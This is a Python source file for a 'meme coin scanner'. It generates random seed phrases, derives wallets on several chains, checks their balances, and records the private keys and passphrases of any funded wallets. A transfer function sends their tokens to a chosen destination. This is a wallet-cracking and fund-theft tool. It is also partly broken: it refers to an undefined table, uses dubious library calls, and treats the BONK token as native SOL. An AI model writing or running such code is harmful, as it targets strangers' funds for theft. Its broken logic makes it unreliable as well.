import os
import json
import time
import logging
from bip44 import Wallet
from web3 import Web3
from solana.rpc.api import Client as SolClient
from solana.publickey import PublicKey
from solana.keypair import Keypair
from solana.system_program import TransferParams, transfer
from solana.rpc.commitment import Confirmed
from pytonlib import TonRpcClient
import requests
from datetime import datetime
from colorama import Fore, Style, init
import mnemonic
import sqlalchemy as db

init(autoreset=True)

NETWORK_CONFIG = {
    "DOGE": {"rpc": "https://dogechain.info/api/v1/"},
    "SHIB": {
        "contract": "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE",
        "decimals": 18,
        "rpc": "https://eth.llamarpc.com"
    },
    "PEPE": {
        "contract": "0x6982508145454Ce325dDbE47a25d4ec3d2311933",
        "decimals": 18,
        "rpc": "https://eth.llamarpc.com"
    },
    "BONK": {
        "contract": "DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263",
        "decimals": 5,
        "rpc": "https://api.mainnet-beta.solana.com"
    },
    "TON": {
        "rpc": "https://toncenter.com/api/v2/jsonRPC",
        "api_key": "freekey"
    },
    "NOT": {
        "contract": "0x68a118Ef45063051Eac49c7e647CE5Ace48a68a5",
        "decimals": 18,
        "rpc": "https://eth.llamarpc.com"
    }
}

class MemeCoinScanner:
    def __init__(self):
        self.setup_logging()
        self.session = requests.Session()
        self.engine = db.create_engine(os.getenv('DATABASE_URL'))
    
    def setup_logging(self):
        logging.basicConfig(
            filename='scanner.log',
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s'
        )
        self.logger = logging.getLogger("MemeCoinScanner")
    
    def generate_passphrases(self, count=1000):
        mnemo = mnemonic.Mnemonic("english")
        return [mnemo.generate(strength=128) for _ in range(count)]
    
    def check_balance(self, coin, address):
        try:
            if coin == "DOGE":
                resp = self.session.get(f"{NETWORK_CONFIG['DOGE']['rpc']}address/balance/{address}")
                return float(resp.json()["balance"]) if resp.ok else 0
            elif coin == "BONK":
                resp = self.session.post(NETWORK_CONFIG["BONK"]["rpc"], json={
                    "jsonrpc": "2.0", "id": 1,
                    "method": "getTokenAccountBalance",
                    "params": [address]
                })
                return float(resp.json()["result"]["value"]["amount"]) / 10**5 if resp.ok else 0
            elif coin == "TON":
                resp = self.session.post(NETWORK_CONFIG["TON"]["rpc"], json={
                    "jsonrpc": "2.0", "id": 1,
                    "method": "getAddressBalance",
                    "params": {"address": address}
                })
                return float(resp.json()["result"]) / 10**9 if resp.ok else 0
            else: # ERC-20 tokens
                w3 = Web3(Web3.HTTPProvider(NETWORK_CONFIG[coin]["rpc"]))
                contract = w3.eth.contract(
                    address=NETWORK_CONFIG[coin]["contract"],
                    abi=[{
                        "constant": True,
                        "inputs": [{"name": "_owner", "type": "address"}],
                        "name": "balanceOf",
                        "outputs": [{"name": "balance", "type": "uint256"}],
                        "type": "function"
                    }]
                )
                balance = contract.functions.balanceOf(address).call()
                return balance / 10**NETWORK_CONFIG[coin]["decimals"]
        except Exception as e:
            self.logger.error(f"Balance check failed: {e}")
            return 0
    
    def transfer_funds(self, coin, private_key, amount, destination):
        try:
            if coin == "DOGE":
                return False, "Dogecoin transfers require additional setup"
            
            elif coin == "BONK":
                solana = SolClient(NETWORK_CONFIG["BONK"]["rpc"])
                sender = Keypair.from_secret_key(bytes.fromhex(private_key))
                
                transfer_ix = transfer(
                    TransferParams(
                        from_pubkey=PublicKey(sender.public_key),
                        to_pubkey=PublicKey(destination),
                        lamports=int(amount * 10**9)
                    )
                )
                
                tx_hash = solana.send_transaction(transfer_ix, sender).value
                return True, tx_hash
                
            elif coin == "TON":
                ton = TonRpcClient(NETWORK_CONFIG["TON"]["rpc"])
                resp = ton.sendTransaction(
                    from_private_key=private_key,
                    to_address=destination,
                    amount=int(amount * 10**9)
                )
                return True, resp['result']['tx_hash']
                
            else: # ERC-20 tokens
                w3 = Web3(Web3.HTTPProvider(NETWORK_CONFIG[coin]["rpc"]))
                account = w3.eth.account.from_key(private_key)
                
                contract = w3.eth.contract(
                    address=NETWORK_CONFIG[coin]["contract"],
                    abi=[{
                        "constant": False,
                        "inputs": [
                            {"name": "_to", "type": "address"},
                            {"name": "_value", "type": "uint256"}
                        ],
                        "name": "transfer",
                        "outputs": [{"name": "", "type": "bool"}],
                        "type": "function"
                    }]
                )
                
                tx = contract.functions.transfer(
                    destination,
                    int(amount * 10**NETWORK_CONFIG[coin]["decimals"])
                ).buildTransaction({
                    'chainId': 1,
                    'gas': 200000,
                    'gasPrice': w3.eth.gas_price,
                    'nonce': w3.eth.get_transaction_count(account.address),
                })
                
                signed_tx = account.sign_transaction(tx)
                tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
                return True, tx_hash.hex()
                
        except Exception as e:
            return False, str(e)
    
    def get_explorer_url(self, coin, tx_hash):
        explorers = {
            "SHIB": f"https://etherscan.io/tx/{tx_hash}",
            "PEPE": f"https://etherscan.io/tx/{tx_hash}",
            "BONK": f"https://solscan.io/tx/{tx_hash}",
            "TON": f"https://tonscan.org/tx/{tx_hash}",
            "NOT": f"https://etherscan.io/tx/{tx_hash}"
        }
        return explorers.get(coin, "#")
    
    def run(self):
        passphrases = self.generate_passphrases(1000)
        
        for phrase in passphrases:
            for coin in ["DOGE", "SHIB", "PEPE", "BONK", "TON", "NOT"]:
                try:
                    wallet = Wallet.from_passphrase(phrase, coin)
                    balance = self.check_balance(coin, wallet.address)
                    
                    if balance > 0:
                        self.logger.info(f"Found {balance} {coin} at {wallet.address}")
                        
                        with self.engine.connect() as conn:
                            conn.execute(db.insert(wallets).values(
                                coin=coin,
                                address=wallet.address,
                                balance=balance,
                                private_key=wallet.private_key,
                                passphrase=phrase,
                                transferred=False
                            ))
                            conn.commit()
                    
                    time.sleep(1) # Rate limiting
                except Exception as e:
                    self.logger.error(f"Error scanning {coin}: {e}")

if __name__ == '__main__':
    scanner = MemeCoinScanner()
    scanner.run()